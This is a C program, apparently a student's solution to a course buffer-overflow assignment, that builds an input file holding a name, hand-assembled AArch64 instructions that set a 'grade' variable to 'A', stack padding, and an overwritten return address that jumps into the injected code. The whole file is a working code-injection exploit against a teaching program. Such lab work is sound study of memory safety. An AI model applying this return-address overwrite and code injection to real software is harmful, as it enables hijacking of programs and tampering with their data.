/*----------------------------------------------------------------------
createdataA.c
Produces a file called dataA with the student name, a nullbyte,
instructions to overwrite the grade variable, null bytes to overrun the
stack, and the address of the instruction in bss to overwrite grade,
the latter of which will overwrite getName's x30.
----------------------------------------------------------------------*/

#include "miniassembler.h"
#include <stdio.h>
#include <stdlib.h>

/* Take no argument. Writes in a file named dataA and returns 0. */
int main(void)
{
    FILE *psFile;
    const char *name = "Ryo, Seungho";
    int i;
    unsigned int instr1, instr2, instr3, instr4;
    /* The address of name[0] */
    unsigned long nameArray = 0x420058;
    /* The distance between buffer array to getName's x30 */
    int distance = 88 - 40;

    psFile = fopen("dataA", "w");
    /* Write names */
    fprintf(psFile, "%s", name);
    /* Length up until now is 12 */
    /* Write null bytes */
    for (i = 0; i < 8; i++)
        fprintf(psFile, "%c", 0x00);
    /* Assembly code */
    /* mov w0, 'A' - name[20] */
    instr1 = MiniAssembler_mov(0, (int)'A');
    (void)fwrite(&instr1, sizeof(unsigned int), 1, psFile);
    /* adr x1, grade - name[24] */
    instr2 = MiniAssembler_adr(1, 0x420044, nameArray + 24);
    (void)fwrite(&instr2, sizeof(unsigned int), 1, psFile);
    /* strb w0, [x1] - name[28] */
    instr3 = MiniAssembler_strb(0, 1);
    (void)fwrite(&instr3, sizeof(unsigned int), 1, psFile);
    /* b 0x40089c - name[32] */
    instr4 = MiniAssembler_b(0x40089c, nameArray + 32);
    (void)fwrite(&instr4, sizeof(unsigned int), 1, psFile);

    /* There are 36 elements in the array up until now */
    distance -= 36;
    /* Write null bytes to overload stack */
    for (i = 0; i < distance; i++)
        fprintf(psFile, "%c", 0x00);
    /* Overwrite getName's x30 address */
    nameArray += 20;
    (void)fwrite(&nameArray, sizeof(unsigned long), 1, psFile);

    fclose(psFile);

    return 0;
}
